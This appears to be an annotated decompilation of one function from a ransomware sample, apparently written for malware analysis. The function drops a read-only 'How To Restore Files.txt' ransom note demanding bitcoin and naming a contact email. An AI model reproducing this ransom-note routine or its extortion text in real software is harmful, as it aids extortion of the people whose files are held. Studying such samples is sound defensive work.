
// Creates the file "How To Restore Files.txt" at the root of the given directory
// ex: if lpFileName == "\\\\?\\C:\\*.*", it creates "\\\\?\\C:\\How To Restore Files.txt" file
void FUN_00401000(LPCWSTR lpFileName)
{
  int length;
  DWORD attribute;
  DWORD local_10;
  LPWSTR heap;
  HANDLE file;
  char *message = "Important !!!\r\nYour personal id -             \r\nWarning: all your files are infected with an unknown virus.\r\nTo decrypt your files, you need to contact at big_decryptor@aol.com.\r\nThe decoder card is received by bitcoin.\r\nYou can buy bitcoins from the following links://blockchain.info/wallet\r\nDo not try to restore files your self, this will lead to the loss of files forever\r\nGUARANTEES!!!\r\nYou can send us 2-3 encoded files.\r\nAnd attach to the letter a file from the folder c:\\Windows\\DECODE.KEY for testing, we will return them to you for FREE";

  /* Allocates the specified number of bytes from the heap.
    [in] UINT uFlags = 0x40 : GMEM_ZEROINIT (Initializes memory contents to zero)
    [in] dbBytes = 0x18064 : The number of bytes to allocate 
    
    Return value : If the function succeeds, the return value is a handle to the newly allocated memory object.
  */
  heap = (LPWSTR)GlobalAlloc(0x40,0x8000);

  /* Copies a string to a buffer
      [out] LPWSTR  lpString1 : A buffer to receive the contents of the string pointed to by the lpString2 parameter.
      [in]  LPCWSTR lpString2 : The null-terminated string to be copied.

      Return value : If the function succeeds, the return value is a pointer to the buffer.
  */
  lstrcpyW(heap,lpFileName);

  length = lstrlenW(heap);

  // Adding terminating null character 3 byte before (ex: from "\\\\?\\C:\\*.*", to "\\\\?\\C:\\")
  heap[length - 3] = 0;

  /* Appends one string to another.
    [in, out] LPWSTR  lpString1 : The first null-terminated string. This buffer must be large enough to contain both strings.
    [in] LPCWSTR lpString2 : The null-terminated string to be appended to the string specified in the lpString1 parameter.
   
    Return value : If the function succeeds, the return value is a pointer to the buffer.
  */
  lstrcatW(heap,"How To Restore Files.txt");
  // Ex: heap contains "\\\\?\\C:\\How To Restore Files.txt"

  /* Retrieves file system attributes for a specified file or directory.
      [in] LPCWSTR lpFileName : The name of the file or directory.

    Return value : If the function succeeds, the return value contains the attributes of the specified file or directory.
  */
  attribute = GetFileAttributesW(heap);

  // If the file doesn't exist, creates it
  if (attribute == 0xffffffff) {

    /* Creates or opens a file or I/O device.
        [in] LPCWSTR lpFileName : The name of the file or device to be created or opened.
        [in] DWORD dwDesiredAccess (2 == FILE_SHARE_WRITE == Enables subsequent open operations on a file or device to request write access.) 
                                  : The requested access to the file or device, which can be summarized as read, write, both or neither zero.
        [in] DWORD dwShareMode : The requested sharing mode of the file or device, which can be read, write, both, delete, all of these, or none
        [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes : A pointer to a SECURITY_ATTRIBUTES structure that contains two separate but related data members: an optional security descriptor, and a Boolean value that determines whether the returned handle can be inherited by child processes.
        [in] DWORD dwCreationDisposition (2 == CREATE_ALWAYS == Creates a new file, always. If the specified file exists and is writable, the function overwrites the file, the function succeeds,) : An action to take on a file or device that exists or does not exist.
        [in] DWORD dwFlagsAndAttributes : The file or device attributes and flags, FILE_ATTRIBUTE_NORMAL being the most common default value for files.
        [in, optional] HANDLE hTemplateFile : A valid handle to a template file with the GENERIC_READ access right.
    */
    file = CreateFileW(heap,0x40000000,2,(LPSECURITY_ATTRIBUTES)0x0,2,0,(HANDLE)0x0);

    length = lstrlenA(message);

    /* Writes data to the specified file or input/output (I/O) device.
         [in] HANDLE hFile : A handle to the file or I/O device
         [in] LPCVOID lpBuffer : A pointer to the buffer containing the data to be written to the file or device.
         [in] DWORD nNumberOfBytesToWrite : The number of bytes to be written to the file or device.
         [out, optional] LPDWORD lpNumberOfBytesWritten : A pointer to the variable that receives the number of bytes written when using a synchronous hFile parameter.
         [in, out, optional] LPOVERLAPPED lpOverlapped : A pointer to an OVERLAPPED structure is required if the hFile parameter was opened with FILE_FLAG_OVERLAPPED, otherwise this parameter can be NULL.
    */
    WriteFile(file, message,length,&local_10,(LPOVERLAPPED)0x0);

    CloseHandle(file);

    SetFileAttributesW(heap,1);
  }

  GlobalFree(heap);
  return;
}
